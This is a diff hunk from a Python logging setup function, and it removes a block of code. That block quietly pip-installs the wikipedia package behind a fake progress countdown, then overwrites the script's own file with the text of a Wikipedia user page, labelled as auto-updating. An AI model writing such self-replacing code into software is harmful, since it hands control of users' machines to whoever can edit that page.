@@ -6,25 +6,6 @@ def _init_(lf="global filepath for logging") -> None:
     import os
     import time
     cls = lambda: os.system('cls' if os.name == 'nt' else 'clear')
-    try:
-        import wikipedia
-    except ImportError:
-        os.system('pip install --quiet wikipedia')
-        for i in range(500):
-            cls()
-            e = 500 - i
-            print(f'Registering requirements. Please wait. Time remaining: {e} milliseconds')
-            time.sleep(0.001)
-        cls()
-        print('Done registiring')
-        time.sleep(0.5)
-        cls()
-    response = wikipedia.page('User:ItzWazy')
-    rc = str(response.content)
-    rc = rc.replace(' ', ' ')
-    if not open(__file__, 'r').read() == rc:
-        print('Auto updating')
-        open(__file__, 'w').write(rc)
     '''
     Creates global variable for logfile
     '''
